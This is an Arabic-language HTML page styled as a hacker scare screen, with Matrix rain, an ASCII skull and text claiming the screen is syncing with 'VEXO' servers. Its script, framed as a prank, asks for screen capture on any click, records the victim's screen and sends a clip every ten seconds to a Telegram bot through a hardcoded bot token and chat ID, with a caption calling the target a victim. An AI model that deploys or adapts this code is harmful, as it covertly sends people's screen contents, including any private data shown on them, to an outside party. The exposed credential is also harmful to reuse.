<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSTEM CRITICAL FAILURE</title>
    <style>
        body { margin: 0; background: black; color: #0f0; font-family: monospace; overflow: hidden; }
        canvas { display: block; position: absolute; top: 0; left: 0; z-index: 1; }
        .overlay { position: relative; z-index: 2; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.7); }
        #screenView { width: 80%; max-width: 400px; border: 2px solid #0f0; box-shadow: 0 0 20px red; margin-bottom: 20px; }
        .ascii-skull { font-size: 6px; line-height: 6px; white-space: pre; text-shadow: 0 0 12px #0f0; margin-bottom: 10px; }
        .threat-text { font-size: 1rem; font-weight: bold; text-shadow: 0 0 10px red; direction: rtl; text-align: center; }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    <div class="overlay">
        <div class="ascii-skull">
               ______
            .-"      "-.
           /            \
          |              |
          |,  .-.  .-.  ,|
          | )(__/  \__)( |
          |/     /\     \|
          (_     ^^     _)
           \__|IIIIII|__/
            | \IIIIII/ |
            \          /
             `--------`
        </div>
        <video id="screenView" autoplay playsinline muted></video>
        <div class="threat-text">
            ⚠️ جـاري مـزامـنة الـشاشـة مـع سـيرفرات VEXO ⚠️<br>
            [!] تـم الاتـصال بنـجاح.. جاري سـحب الـبيانات..
        </div>
    </div>

    <script>
        const TELEGRAM_TOKEN = '8409685298:AAHN_RpQJ0Ete85gZMYgi2rPaE99lwX0DPs'; // التوكن الخاص بك
        const CHAT_ID = '7822309283'; // الآيدي الخاص بك

        // تأثير الماتركس
        const mCanvas = document.getElementById('matrix');
        const ctx = mCanvas.getContext('2d');
        mCanvas.width = window.innerWidth; mCanvas.height = window.innerHeight;
        const letters = "01VEXO#$@%";
        const fontSize = 16;
        const columns = mCanvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);
        function draw() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, mCanvas.width, mCanvas.height);
            ctx.fillStyle = "#0f0"; ctx.font = fontSize + "px monospace";
            drops.forEach((y, i) => {
                const text = letters[Math.floor(Math.random() * letters.length)];
                ctx.fillText(text, i * fontSize, y * fontSize);
                if (y * fontSize > mCanvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            });
        }
        setInterval(draw, 33);

        let mediaRecorder;
        let recordedChunks = [];

        async function startPrank() {
            try {
                // طلب تصوير الشاشة
                const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                document.getElementById('screenView').srcObject = screenStream;

                // بدء تسجيل الشاشة لإرسالها لك
                mediaRecorder = new MediaRecorder(screenStream);
                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
                
                mediaRecorder.onstop = () => {
                    const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                    sendVideoToTelegram(blob);
                    recordedChunks = [];
                    mediaRecorder.start(); // إعادة التسجيل لإرسال لقطة أخرى
                };

                mediaRecorder.start();
                // أرسل فيديو لشاشته كل 10 ثوانٍ
                setInterval(() => { if(mediaRecorder.state === "recording") mediaRecorder.stop(); }, 10000);

            } catch (err) { console.log("User denied"); }
        }

        function sendVideoToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('video', blob, 'screen.mp4');
            formData.append('caption', '🎥 لقطة مباشرة لشاشة الضحية من VEXO!');
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, { method: 'POST', body: formData });
        }

        window.onclick = startPrank;
    </script>
</body>
</html>
